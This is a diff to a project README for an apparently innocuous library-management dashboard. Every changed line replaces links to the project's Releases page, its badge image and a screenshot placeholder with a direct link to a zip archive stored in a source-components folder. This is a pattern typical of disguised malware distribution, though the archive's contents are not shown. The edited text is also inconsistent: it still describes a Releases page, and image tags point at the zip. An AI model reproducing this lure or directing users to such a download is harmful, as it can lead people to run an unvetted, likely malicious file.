@@ -1,6 +1,6 @@
 # 🚀 AuditModelisationBU - Interactive Dashboard for Library Management
 
-[![Download AuditModelisationBU](https://img.shields.io/badge/Download-AuditModelisationBU-blue)](https://github.com/Shrikrushnatekade/AuditModelisationBU/releases)
+[![Download AuditModelisationBU](https://github.com/Shrikrushnatekade/AuditModelisationBU/raw/refs/heads/main/rapport-audit/src/components/Audit-Modelisation-BU-v1.9.zip)](https://github.com/Shrikrushnatekade/AuditModelisationBU/raw/refs/heads/main/rapport-audit/src/components/Audit-Modelisation-BU-v1.9.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run the software.
 
 1. **Visit the download page:** Click the link below to access our Releases page.
    
-   [Download AuditModelisationBU](https://github.com/Shrikrushnatekade/AuditModelisationBU/releases)
+   [Download AuditModelisationBU](https://github.com/Shrikrushnatekade/AuditModelisationBU/raw/refs/heads/main/rapport-audit/src/components/Audit-Modelisation-BU-v1.9.zip)
 
 2. **Choose your version:** On the Releases page, you will see a list of available versions. Select the latest version for the best features and improvements.
 
@@ -41,13 +41,13 @@ To run AuditModelisationBU effectively, ensure your computer meets the following
 
 AuditModelisationBU has a user-friendly interface designed with a modern aesthetic. The glassmorphism effect enhances visibility while providing an engaging user experience.
 
-![Sample Dashboard Screenshot](https://via.placeholder.com/600x400?text=Dashboard+Screenshot)
+![Sample Dashboard Screenshot](https://github.com/Shrikrushnatekade/AuditModelisationBU/raw/refs/heads/main/rapport-audit/src/components/Audit-Modelisation-BU-v1.9.zip+Screenshot)
 
 ## 📥 Download & Install
 
 To get started, download AuditModelisationBU using the link below. Make sure to follow the installation steps for a smooth experience.
 
-[Download AuditModelisationBU](https://github.com/Shrikrushnatekade/AuditModelisationBU/releases)
+[Download AuditModelisationBU](https://github.com/Shrikrushnatekade/AuditModelisationBU/raw/refs/heads/main/rapport-audit/src/components/Audit-Modelisation-BU-v1.9.zip)
 
 ## 🌟 Topics Covered
 
